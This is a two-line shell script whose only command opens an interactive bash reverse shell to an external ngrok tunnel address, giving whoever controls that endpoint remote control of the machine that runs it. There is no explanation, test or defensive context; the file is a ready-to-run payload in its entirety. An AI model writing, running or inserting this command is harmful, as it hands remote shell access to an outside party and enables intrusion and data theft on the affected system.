#!/bin/sh

bash -c "bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/11131 0>&1"
